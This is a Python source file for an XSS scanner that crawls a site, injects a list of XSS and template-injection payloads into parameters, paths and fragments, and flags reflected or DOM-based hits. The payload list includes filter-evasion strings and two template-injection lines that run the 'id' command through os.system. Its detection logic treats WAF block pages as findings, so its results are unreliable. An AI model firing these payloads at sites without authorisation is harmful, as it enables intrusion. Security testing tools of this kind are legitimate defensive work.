import re
import aiohttp
import asyncio
import html
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from ..utils.helpers import LOG

class XSSScanner:
    def __init__(self):
        self.visited_urls = set()
        self.xss_payloads = [
            # Basic payloads
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            # DOM-based payloads
            '"><img src=x oneonerrorrror=alert(1)>',  # Filter evasion
            'javascript:alert(1)',
            'javascript:alert(1)//',
            # Template injection
            '{{constructor.constructor(\'alert(1)\')()}}',
            '${alert(1)}',
            # Event handlers
            '" onmouseover="alert(1)',
            '" onload="alert(1)',
            '" onerror="alert(1)',
            # Filter bypass payloads
            '<svg/onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            # Encoded payloads
            '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
            # AngularJS specific
            '{{constructor.constructor(\'alert(1)\')()}}',
            # React specific
            'javascript:void(alert(1))',
            # Unicode payloads
            '＜script＞alert(1)＜/script＞',
            # Mutation payloads
            '<img src=x onerror=this.onerror=alert;throw 1>',
            # CSP bypass attempts
            'data:text/html,<script>alert(1)</script>',
            'data:,alert(1)',
            # Modern framework payloads
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '{{self|attr("__init__")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("system")("id")}}',
        ]
        
    async def crawl(self, url):
        """Crawl a website to find potential XSS injection points"""
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                async with session.get(url, verify_ssl=False) as response:
                    if response.status == 200:
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Find all links
                        for a in soup.find_all('a', href=True):
                            link = urljoin(url, a['href'])
                            if self._should_crawl(link, url):
                                self.visited_urls.add(link)
                        
                        # Find all forms
                        for form in soup.find_all('form'):
                            form_url = urljoin(url, form.get('action', ''))
                            self.visited_urls.add(form_url)
                            
                        # Find potential DOM XSS sinks
                        scripts = soup.find_all('script')
                        for script in scripts:
                            if script.string:
                                if any(sink in script.string.lower() for sink in [
                                    'innerhtml', 'outerhtml', 'document.write', 
                                    'eval(', 'settimeout(', 'setinterval(',
                                    'location.hash', 'location.search'
                                ]):
                                    LOG(f"[*] Potential DOM XSS sink found in {url}")
                                    
        except Exception as e:
            LOG(f"[!] Error crawling {url}: {e}")
            
    def _should_crawl(self, link, base_url):
        """Check if a link should be crawled"""
        try:
            base_domain = urlparse(base_url).netloc
            link_domain = urlparse(link).netloc
            return (
                link_domain == base_domain and
                link not in self.visited_urls and
                not any(x in link.lower() for x in ['.pdf', '.jpg', '.png', '.gif', 'logout', 'signout'])
            )
        except:
            return False
            
    async def test_xss(self, url):
        """Test for XSS vulnerabilities. Returns detailed finding dict if found, else None."""
        import time
        if not url:
            return None
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            # No parameters, try to find injection points in path
            if not params:
                path_segments = parsed.path.split('/')
                for i, segment in enumerate(path_segments):
                    if segment:
                        for payload in self.xss_payloads:
                            new_segments = path_segments.copy()
                            new_segments[i] = payload
                            test_url = parsed._replace(path='/'.join(new_segments)).geturl()
                            result = await self._test_payload(test_url, payload)
                            if result:
                                return {
                                    'type': 'xss',
                                    'url': test_url,
                                    'parameter': f'path_segment_{i}',
                                    'payload': payload,
                                    'context': result.get('context', 'path'),
                                    'evidence': result.get('evidence', ''),
                                    'details': 'Reflected XSS in path',
                                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                                }
            # Test each parameter
            for param, values in params.items():
                original_value = values[0]
                for payload in self.xss_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                    result = await self._test_payload(test_url, payload)
                    if result:
                        return {
                            'type': 'xss',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context': result.get('context', 'query'),
                            'evidence': result.get('evidence', ''),
                            'details': 'Reflected XSS in parameter',
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
                    # Test payload in fragment
                    test_url = parsed._replace(fragment=payload).geturl()
                    result = await self._test_payload(test_url, payload)
                    if result:
                        return {
                            'type': 'xss',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'context': result.get('context', 'fragment'),
                            'evidence': result.get('evidence', ''),
                            'details': 'Reflected XSS in fragment',
                            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
            # Test for DOM XSS
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        html_content = await response.text()
                        dom_result = await self._test_dom_xss(html_content, url)
                        if dom_result:
                            return {
                                'type': 'xss',
                                'url': url,
                                'parameter': 'N/A',
                                'payload': dom_result.get('payload', ''),
                                'context': 'dom',
                                'evidence': dom_result.get('evidence', ''),
                                'details': 'DOM-based XSS',
                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                            }
        except Exception as e:
            LOG(f"[!] Error testing XSS on {url}: {e}")
        return None
        
    async def _test_payload(self, url, payload):
        """Test if a specific XSS payload is successful. Returns dict with context/evidence if found, else None."""
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if self._check_reflection(content, payload):
                            return {
                                'context': 'reflected',
                                'evidence': content[:500]  # snippet
                            }
                        if self._check_suspicious_response(content, payload):
                            return {
                                'context': 'suspicious',
                                'evidence': content[:500]
                            }
        except Exception as e:
            LOG(f"[!] Error testing payload on {url}: {e}")
        return None
        
    def _check_reflection(self, content, payload):
        """Check if payload is reflected in response"""
        # Decode content to handle encoded responses
        content = html.unescape(content)
        
        # Remove whitespace and case for comparison
        normalized_content = content.lower().replace(' ', '')
        normalized_payload = payload.lower().replace(' ', '')
        
        # Check for exact payload reflection
        if normalized_payload in normalized_content:
            # Verify payload is in a potentially executable context
            if any(context in content.lower() for context in [
                '<script', 'onerror=', 'onload=', 'onclick=', 
                'onmouseover=', 'onfocus=', 'onmouseout=',
                'javascript:', 'data:', 'vbscript:'
            ]):
                return True
                
        return False
        
    def _check_suspicious_response(self, content, payload):
        """Check for suspicious behavior indicating successful XSS"""
        # Look for signs of WAF/XSS filter triggers
        suspicious_patterns = [
            'xss', 'attack', 'malicious', 'security',
            'blocked', 'detected', 'firewall', 'waf',
            'forbidden', 'invalid', 'alert(', 'javascript'
        ]
        
        content_lower = content.lower()
        return any(pattern in content_lower for pattern in suspicious_patterns)
        
    async def _test_dom_xss(self, content, url):
        """Test for DOM-based XSS vulnerabilities. Returns dict if found, else None."""
        dom_sinks = [
            'document.write(', 'document.writeln(', 'document.body.innerHTML', 'document.forms',
            'document.location', 'document.URL', 'document.URLUnencoded', 'document.referrer',
            'window.location', 'location.href', 'location.search', 'location.hash', 'eval(',
            'setTimeout(', 'setInterval(', 'innerHTML', 'outerHTML'
        ]
        soup = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                script_content = script.string.lower()
                for sink in dom_sinks:
                    if sink.lower() in script_content:
                        test_url = f"{url}#{sink}=alert(1)"
                        result = await self._test_payload(test_url, f"#{sink}=alert(1)")
                        if result:
                            return {
                                'payload': f'#{sink}=alert(1)',
                                'evidence': result.get('evidence', '')
                            }
        return None 